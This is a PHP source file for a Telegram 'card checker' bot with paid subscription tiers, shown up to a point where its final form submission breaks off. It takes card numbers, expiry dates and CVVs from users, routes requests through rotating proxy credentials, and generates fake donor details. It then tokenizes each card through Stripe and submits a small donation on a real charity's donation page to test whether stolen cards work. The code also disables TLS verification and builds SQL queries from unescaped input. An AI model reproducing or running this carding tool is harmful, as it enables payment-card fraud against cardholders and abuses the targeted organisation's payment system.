<?php
list($cmd) = explode(" ", $text);
if($cmd == "/test" or $cmd == ".test" or $cmd == "!ttst" or $cmd == "?gsh" or $cmd == "#hh" or $cmd == ":hh," or $cmd == ",hh"){ 

    // if($user_id !=5197853005){
    //     $content = ['chat_id' => $chat_id, 'text' => "𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑶𝒇𝒇 ❌ Proxy Dead", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
    //     SendMessage($content);
    //     exit();
    // }

    $lista = explode(" ", $text)[1];
    $sql = "SELECT planexpiry FROM administrar WHERE id='$user_id'";
    $result = mysqli_query(mysqlcon(), $sql);
    
    $json_array = [];
    
    
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    
    $final2 = json_encode($json_array);
    
    
    $file = fopen("test.txt","w");
    echo fwrite($file,$message_id);
    fclose($file);
    
    $planexpiry = anicap($final2, '"planexpiry":"','"');
    mysqli_close(mysqlcon());
    
    
    $sql = "SELECT plan FROM administrar WHERE id='$user_id'";
    $result = mysqli_query(mysqlcon(), $sql);
    
    $json_array = [];
    
    
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    
    $final2 = json_encode($json_array);
    
    $plan = anicap($final2, '"plan":"','"');
    mysqli_close(mysqlcon());
    
    $now = time();
      if ($planexpiry < $now && $planexpiry == 0) {
    }
elseif ($planexpiry < $now && $plan != "Free User") {
    
    // Check connection
    // Attempt create database query execution
    $sql = "UPDATE `administrar` SET `plan` = 'Free User' WHERE `administrar`.`id` = '$user_id';";
    $result = mysqli_query(mysqlcon(), $sql);
    // Close connection
    mysqli_close(mysqlcon());
    
    
    $sql = "UPDATE `administrar` SET `planexpiry` = '0' WHERE `administrar`.`id` = '$user_id';";
    $result = mysqli_query(mysqlcon(), $sql);
    // Close connection
    mysqli_close(mysqlcon());
    $content = ['chat_id' => $chat_id, 'text' => "<b>𝒀𝒐𝒖𝒓 𝒔𝒖𝒃𝒔𝒄𝒓𝒊𝒑𝒕𝒊𝒐𝒏 𝒑𝒍𝒂𝒏 𝒊𝒔 𝒆𝒙𝒑𝒊𝒓𝒆𝒅, 𝑷𝒍𝒆𝒂𝒔𝒆 𝒄𝒐𝒏𝒕𝒂𝒄𝒕 @BossNetworkk 𝒕𝒐 𝒓𝒆𝒏𝒆𝒘</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }
    $SQL = "SELECT * FROM `authorize` WHERE chats=".$chat_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $f = mysqli_num_rows($CONSULTA);
    $json_array = [];


    while ($row = mysqli_fetch_assoc($CONSULTA)) {
    $json_array[] = $row;
    }

    $final2 = json_encode($json_array);

    $chats =anicap($final2, '"chats":"','"');
    if($chats != $chat_id and $ctype == "supergroup"){
        $content = ['chat_id' => $chat_id, 'text' => "𝑻𝒉𝒊𝒔 𝒈𝒓𝒐𝒖𝒑 𝒊𝒔𝒏'𝒕 𝒂𝒖𝒕𝒉𝒐𝒓𝒊𝒛𝒆𝒅 𝒕𝒐 𝒖𝒔𝒆 𝒎𝒆, 𝒄𝒐𝒏𝒕𝒂𝒄𝒕 @BossNetworkk", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit();
    }
    else{
        
       
    }
    $SQL = "SELECT * FROM `ADMINISTRAR` WHERE id=".$user_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $json_array = [];


    while ($row = mysqli_fetch_assoc($CONSULTA)) {
    $json_array[] = $row;
    }

    $final2 = json_encode($json_array);

    $plan =anicap($final2, '"plan":"','"');
    mysqli_close(mysqlcon());
    $SQL = "SELECT * FROM `ADMINISTRAR` WHERE plan=".$plan;
    if(empty($plan)){
        $content = ['chat_id' => $chat_id, 'text' => "𝑳𝒐𝒐𝒌𝒔 𝑳𝒊𝒌𝒆 𝒀𝒐𝒖 𝒉𝒂𝒗𝒆𝒏'𝒕 𝒓𝒆𝒈𝒊𝒔𝒕𝒆𝒓𝒆𝒅 𝒚𝒐𝒖𝒓 𝒔𝒆𝒍𝒇, 𝒅𝒐 /register 𝒕𝒐 𝒄𝒐𝒏𝒕𝒊𝒏𝒖𝒆", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    if($plan == "Free User" and $ctype == "private"){
        $content = ['chat_id' => $chat_id, 'text' => "𝒀𝒐𝒖 𝒂𝒓𝒆 𝒏𝒐𝒕 𝒂𝒖𝒕𝒉𝒐𝒓𝒊𝒛𝒆𝒅 𝒕𝒐 𝒖𝒔𝒆 𝒎𝒆 𝒊𝒏 𝒑𝒓𝒊𝒗𝒂𝒕𝒆 𝒑𝒖𝒓𝒄𝒉𝒂𝒔𝒆 𝒑𝒓𝒆𝒎𝒊𝒖𝒎 𝒇𝒓𝒐𝒎 @BossNetworkk", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    $SQL = "SELECT * FROM `ADMINISTRAR` WHERE id=".$user_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $f = mysqli_num_rows($CONSULTA);

    if($f > 0)
    {} else{
        $content = ['chat_id' => $chat_id, 'text' => "𝑳𝒐𝒐𝒌𝒔 𝑳𝒊𝒌𝒆 𝒀𝒐𝒖 𝒉𝒂𝒗𝒆𝒏'𝒕 𝒓𝒆𝒈𝒊𝒔𝒕𝒆𝒓𝒆𝒅 𝒚𝒐𝒖𝒓 𝒔𝒆𝒍𝒇, 𝒅𝒐 /register 𝒕𝒐 𝒄𝒐𝒏𝒕𝒊𝒏𝒖𝒆", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit;
    }
    // if($plan == "Free User"){
    //     $content = ['chat_id' => $chat_id, 'text' => "𝒀𝒐𝒖 𝒂𝒓𝒆 𝒏𝒐𝒕 𝒂𝒖𝒕𝒉𝒐𝒓𝒊𝒛𝒆𝒅 𝒑𝒖𝒓𝒄𝒉𝒂𝒔𝒆 𝒑𝒓𝒆𝒎𝒊𝒖𝒎 𝒇𝒓𝒐𝒎 @BossNetworkk", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
    //         $m1  = SendMessage($content);
    //         exit();
    // }
    // else{}
    if (empty($lista)) {
        $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒂 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
    } else {
        $check = strlen($lista);
        $chem = substr($lista, 0, 1);
        $vaut = array(1, 2, 7, 8, 9, 0);
        preg_match_all('/\d+/', $text, $matches);
    if (count($matches[0]) == 3) {
        $cc = $matches[0][0];
        $mes = substr($matches[0][1], 0, 2);
        $ano = substr($matches[0][1], -2);
        $cvv = $matches[0][2];
    } else if (strlen($matches[0][1]) == 3) {
        $cc = $matches[0][0];
        $ano1 = $matches[0][2];
        $ano = $matches[0][3];
        $cvv = $matches[0][1];
        $mes = $ano1;
    } else {
        $cc = $matches[0][0];
        $mes = $matches[0][1];
        $ano = $matches[0][2];
        $cvv = $matches[0][3];
    }
    $bin = substr($cc,0,6);
    $first1 = substr($cc,0,1);
    if($first1 == "4"){
        $cc_type = "5963a708-fc7f-48af-952f-16d574c4b833";
    }
    if($first1 == "5"){
        $cc_type = "b34832f7-8a95-47fa-9c43-bc8682562ea5";
    }
    if($first1 == "3"){
        $cc_type = "c4a56513-9fdb-44c5-9b19-e617f2596107";
    }
    if($mes == "01"){
        $sub_mes = "1";
    }elseif($mes == "02"){
        $sub_mes = "2";
    }elseif($mes == "03"){
        $sub_mes = "3";
    }elseif($mes == "04"){
        $sub_mes = "4";
    }elseif($mes == "05"){
        $sub_mes = "5";
    }elseif($mes == "06"){
        $sub_mes = "6";
    }elseif($mes == "07"){
        $sub_mes = "7";
    }elseif($mes == "08"){
        $sub_mes = "8";
    }elseif($mes == "09"){
        $sub_mes = "9";
    }elseif($mes == "10"){
        $sub_mes = "10";
    }elseif($mes == "11"){
        $sub_mes = "11";
    }elseif($mes == "12"){
        $sub_mes = "12";
    }
    $cc1 = substr($cc, 0, 4);
$cc2 = substr($cc, 4, -8);
$cc3 = substr($cc, 8, -4);
$cc4 = substr($cc, -4);

    //        'ihojryep-rotate:a75v25f6afx1',
    //"psyohwld-rotate:hdxu4zfaz5ip",
    $rotate = array(
        'U99pbU:yM0wAf',
        'oCqNRH:i18i58',
        'PfO6EN:3j04W4',
        'oXGn5O:E3lj3G',
        'lr9wwO:x33pVi',
        '2jCHw9:KzDDgy',
        'UbFFce:3Ftrj2',
        'K5VKJa:8zdAZT',
        'f951hv:k0YRer',
        '1pYsMR:TonSB4',
        'A7t28n:XEDwsb',

        );
        
        $user_pass = $rotate[array_rand($rotate)];
    //         "AUTH"   => "unoehbda-rotate:2bxs8q2xfbks"
    $server = [
        "METHOD" => "CUSTOM",
        "SERVER" => "p.webshare.io:80",


        "AUTH"   => "rteavycr-rotate:f9o3l1ryizdq"
    ];
    

        if (in_array($chem, $vaut)) {
            $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒗𝒂𝒍𝒊𝒅 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        } elseif ($check < 15) {
            $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒗𝒂𝒍𝒊𝒅 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        }
        if (strlen($ano) == 2) {
            $ano = "20" . $ano;
        }
        $SQL = "SELECT * FROM `ADMINISTRAR` WHERE id=".$user_id;
        $c = mysqli_query(mysqlcon(),$SQL);
        $time = 30;
        $RAW = mysqli_fetch_assoc($c);
        $ANTISPAM = $RAW['antispam'];
        $Rango = $RAW['rango'];
        $TIMEAC = time() - $ANTISPAM;
        if($TIMEAC < 30)
        {
            $TotalTime = $time - $TIMEAC;
            if($plan !== "Free User"){

            }elseif($TotalTime > 0){
            $content = ['chat_id' => $chat_id, 'text' => "<b>┏━━━━━━━━━━━━━━\n┣ 🍁 𝑨𝒏𝒕𝒊𝒔𝒑𝒂𝒎 𝑫𝒆𝒕𝒆𝒄𝒕𝒆𝒅 🍁\n┗━━━━━━━━━━━━━━\n══════════════════════\n[ϟ] 𝑨𝒏𝒕𝒊𝒔𝒑𝒂𝒎 : <code><i>$TotalTime</i></code>s\n══════════════════════</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit;
            }
        }
    $banned_bins = ['485953', '650907', '515462', '489504', '534417', '483698', '403015', '435880', '522158', '515478', '440393', '472926', '498503', '542418', '559900', '540324', '484718', '423223', '510404', '546616', '459192', '510409', '539817', '429435', '426370', '521069', '549627', '437507', '542717', '520593', '494656', '529794', '457286', '428303', '476771', '531106', '494160', '411810', '409177', '481969', '536595', '557945', '485340', '530446', '511114', '559591', '549184', '414720', '546775', '414397', '437303', '424067', '540449', '475465', '524038', '435167', '511098', '499818', '537489', '547115', '414398', '512487', '420495', '430460', '521380', '425032', '530544', '491449', '522714', '567511', '154620', '432672', '537445', '526293', '403935', '533621', '401924', '402360', '489049', '533325', '402018', '405482', '535463', '533814', '529559', '538923', '535456', '531108', '541591', '481776', '403446', '540302', '533935', '498872', '540608', '472776', '533248', '484224', '446053', '410039', '601120', '442732', '377935', '543816', '601149', '372300', '529750', '415285', '415231', '473327', '408832', '514503', '523434', '450742', '518375', '485246', '537664', '554714', '533728', '525855', '410489', '522686', '412003', '443161', '440229', '459510', '539123', '519325', '531340', '530347', '516488', '436681', '559911', '457572', '464732', '546001', '468840', '453756', '525103', '601140', '545348', '533317', '411600', '537697', '511558', '467199', '464556', '424002', '557348', '442743', '530551', '403995', '483039', '483316', '416860', '521403', '405433', '539689', '526736', '481775', '515472', '511516', '442062', '526274', '444607', '539636', '451431', '533582', '438959', '402361', '445785', '512773', '453744', '539634', '511361', '440353', '455172', '529053', '520828', '404841', '473690', '478499', '539591', '416995', '526491', '422589', '419113', '469395', '548793', '515477', '402063', '527527', '527368', '549399', '554730', '467321', '533004', '526430', '441686', '428149', '493452', '523471', '453308', '428346', '428307', '416722', '529086', '454481', '414693', '411192', '413514', '516989', '513213', '400045', '481285', '519404', '519280', '540226', '511565', '527346', '441101', '539854', '530706', '559758', '517805', '511673', '527789', '511332', '530690', '542935', '529275', '511774', '524467', '452018', '403530', '469396', '511350', '511321', '404386', '473947', '485912', '409758', '517476', '527837', '535971', '515519', '400331', '493595', '511564', '527395', '445507', '536659', '432465', '522096', '439457', '400921', '453081', '522157', '404585', '538875', '516121', '522719', '534228', '544544', '491288', '511563', '528227', '453973', '544586', '403905', '516155', '537207', '411894', '408635', '522725', '539226', '526250', '441070', '424840', '515101', '512092', '529063', '489212', '511317', '457949', '533862', '527329', '515549', '410352', '407714', '400632', '451002', '537911', '530772', '428486', '511330', '519532', '546324', '516532', '533813', '548274', '516502', '510087', '557838', '513207', '530964', '514998', '534548', '516520', '516508', '542837', '533281', '511560', '527351', '529567', '448975', '531170', '515554', '533821', '535480', '544768', '423991', '538651', '533984', '532081', '425096', '538792', '511089', '530082', '537666', '539186', '527069', '539175', '548566', '544679', '485320', '451129', '517163', '420064', '533323', '494159', '526724', '537915', '484735', '527660', '401188', '432168', '512150', '533842', '511467', '513252', '532164', '401921', '479613', '468271', '401719', '402400', '401658', '400022', '475129', '416598', '548398', '506731', '563294', '459354', '549622', '416994', '639167', '475675', '472409', '415059', '432154', '445677', '419973', '455479', '427432', '510126', '529172', '529923', '428813', '532613', '454861', '540300', '540305', '540309', '540333', '540335', '540350', '540356', '540357', '540369', '540396', '544215', '554723', '554756', '627895', '376752', '357401', '372742', '375150', '422803', '459654', '530072', '466544', '468789', '514858', '422403', '473653',];
        // if($bin == "440393"){
        //     $content = ['chat_id' => $chat_id, 'text' => "<b>Bin Blocked leccher</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        //     $m1  = SendMessage($content);
        //     exit;
        // }else {
                
        // }
        $che = bannedbin($bin);
        if($che == true){
                $content = ['chat_id' => $chat_id, 'text' => "<b>Bin Blocked leccher</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
                $m1  = SendMessage($content);
                exit();
        }
        $timest = time();
        $SQL = "UPDATE ADMINISTRAR SET antispam = '$timest' WHERE id=".$user_id;
        $CONSULTA = mysqli_query(mysqlcon(),$SQL);
        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕...</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        $m1i = $m1['result']['message_id'];
        

        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ■□□□□</b>", 'message_id' => $m1i, 'parse_mode' => 'html'];
        $m2  = EditMessageText($content);
        $m2i = $m2['result']['message_id'];

        /*----------  R2 CAPTCHA  ----------*/
        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ■■■□□</b>", 'message_id' => $m2i, 'parse_mode' => 'html'];
        $m3  = EditMessageText($content);
        $m3i = $m3['result']['message_id'];
#-------------------- Bin -------------#
$cctwo = substr("$cc", 0, 6);
$curl = curl_init();
curl_setopt_array($curl, [
CURLOPT_URL => "https://bins-su-ani.vercel.app/api/".$bin,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_ENCODING => "",
CURLOPT_MAXREDIRS => 10,
CURLOPT_TIMEOUT => 30,
CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
CURLOPT_CUSTOMREQUEST => "GET",
CURLOPT_HTTPHEADER => [
"accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"accept-language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7",
"sec-fetch-dest: document",
"sec-fetch-site: none",
"user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
],
]);

$result = curl_exec($curl);
curl_close($curl);
$data = json_decode($result, true);
$bank = $data['data']['bank'];
$country = $data['data']['country'];
$brand = $data['data']['vendor'];
$level = $data['data']['level'];
$type = $data['data']['type'];
$flag = $data['data']['countryInfo']['emoji'];
$result1 = $data['result'];


# ------------ Ramdom User ------------ #

$name = ucfirst(str_shuffle('anibhai'));
$last = ucfirst(str_shuffle('pemro'));
$email = "Dabilol".substr(md5(uniqid()), 0, 8)."@gmail.com";
$street = "".rand(0000,9999)." Main Street";
$ph = array("682","346","246");
$ph1 = array_rand($ph);
$phh = $ph[$ph1];
$phone = "$phh".rand(0000000,9999999)."";
$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$statee = $st[$st1];
if ($statee == "NY"){
$state = "New York";
$zip = "10080";
$city = "New York";
}
elseif ($statee == "WA"){
$state = "Washington";
$zip = "98001";
$city = "Auburn";
}
elseif ($statee == "AL"){
$state = "Alabama";
$zip = "35005";
$city = "Adamsville";
}
elseif ($statee == "FL"){
$state = "Florida";
$zip = "32003";
$city = "Orange Park";
}else{
$state = "California";
$zip = "90201";
$city = "Bell";
};

        /*----------  R2 STRIPE  ----------*/
$cookie = uniqid();


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.fellowshiphall.com/donate/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'authority: www.fellowshiphall.com';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: en-US;q=0.7';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$curl = curl_exec($ch);
curl_close($ch);
$state_83 = getData($curl,"<input type='hidden' class='gform_hidden' name='state_83' value='","'");
#$uniid = getData($curl,"<input type='hidden' class='gform_hidden' name='gform_unique_id' value='","'");
$nonce = getData($curl,'"create_payment_intent_nonce":"','"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: api.stripe.com';
$headers[] = 'accept: application/json';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-length: 466';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://js.stripe.com';
$headers[] = 'referer: https://js.stripe.com/';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]=jhkn+ksij&billing_details[address][postal_code]=10090&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=9cf60f40-046d-450b-b7dd-f90c006b598108ebeb&muid=1ebf3a00-e7ce-4cf9-9156-f921cb9d9901f17b6a&sid=c4ee2992-bca9-46fd-b313-04a12fec541653dd4c&pasted_fields=number&payment_user_agent=stripe.js%2Fa7dcd724c%3B+stripe-js-v3%2Fa7dcd724c&time_on_page=144018&key=pk_live_ABsHg8nSOQYyWFamwdF5DtRI00vR5RPrN3');
$curl = curl_exec($ch);
curl_close($ch);
$id = getData($curl,'"id": "','"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.fellowshiphall.com/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: www.fellowshiphall.com';
$headers[] = 'accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'origin: https://www.fellowshiphall.com';
$headers[] = 'referer: https://www.fellowshiphall.com/donate/';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36';
$headers[] = 'x-requested-with: XMLHttpRequest';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=gfstripe_create_payment_intent&nonce='.$nonce.'&payment_method%5Bid%5D='.$id.'&payment_method%5Bobject%5D=payment_method&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bcity%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bcountry%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bline1%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bline2%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bpostal_code%5D=10090&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bstate%5D=&payment_method%5Bbilling_details%5D%5Bemail%5D=&payment_method%5Bbilling_details%5D%5Bname%5D=jhkn+ksij&payment_method%5Bbilling_details%5D%5Bphone%5D=&payment_method%5Bcard%5D%5Bbrand%5D=visa&payment_method%5Bcard%5D%5Bchecks%5D%5Baddress_line1_check%5D=&payment_method%5Bcard%5D%5Bchecks%5D%5Baddress_postal_code_check%5D=&payment_method%5Bcard%5D%5Bchecks%5D%5Bcvc_check%5D=&payment_method%5Bcard%5D%5Bcountry%5D=US&payment_method%5Bcard%5D%5Bexp_month%5D=9&payment_method%5Bcard%5D%5Bexp_year%5D=2027&payment_method%5Bcard%5D%5Bfunding%5D=debit&payment_method%5Bcard%5D%5Bgenerated_from%5D=&payment_method%5Bcard%5D%5Blast4%5D=2976&payment_method%5Bcard%5D%5Bnetworks%5D%5Bavailable%5D%5B%5D=visa&payment_method%5Bcard%5D%5Bnetworks%5D%5Bpreferred%5D=&payment_method%5Bcard%5D%5Bthree_d_secure_usage%5D%5Bsupported%5D=true&payment_method%5Bcard%5D%5Bwallet%5D=&payment_method%5Bcreated%5D=1655467302&payment_method%5Bcustomer%5D=&payment_method%5Blivemode%5D=true&payment_method%5Btype%5D=card&currency=USD&amount=50&feed_id=37');
$curl = curl_exec($ch);
curl_close($ch);
$id2 = getData($curl,'"id":"','"');
$client_secret = getData($curl,'client_secret":"','"');
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.fellowshiphall.com/donate/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: www.fellowshiphall.com';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: en-US;q=0.7';
$headers[] = 'content-type: multipart/form-data; boundary=----WebKitFormBoundaryRGheFugj8n5dqkP3';
$headers[] = 'origin: https://www.fellowshiphall.com';
$headers[] = 'referer: https://www.fellowshiphall.com/donate/';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="input_24"

Annual Fund
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="input_43"

No
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="input_45"

No
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="input_39"

One-Time Gift Option
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="input_42"

Other Amount|0
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="input_28"

$ 0.50
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="input_49"


------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="input_33.3"

jhons
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="input_33.6"

kith
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="input_4"

aircracker2021@hotmail.com
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="input_3"

(941) 837-8837
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="input_16.1"

street 837 
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="input_16.2"


------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="input_16.3"

New York
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="input_16.4"

New York
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="input_16.5"

10080
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="input_16.6"

United States
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="input_26"

0.5
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="input_50.5"

jhkn ksij
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="gform_ajax"

form_id=83&title=&description=&tabindex=0
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="is_submit_83"

1
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="gform_submit"

83
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="gform_unique_id"


------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="state_83"

'.$state_83.'
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="gform_target_page_number_83"

0
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="gform_source_page_number_83"

1
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="gform_field_values"


------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="ct_checkjs"

376629096
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="ak_hp_textarea"


------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="ak_js"

1655467154146
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="apbct_visible_fields"

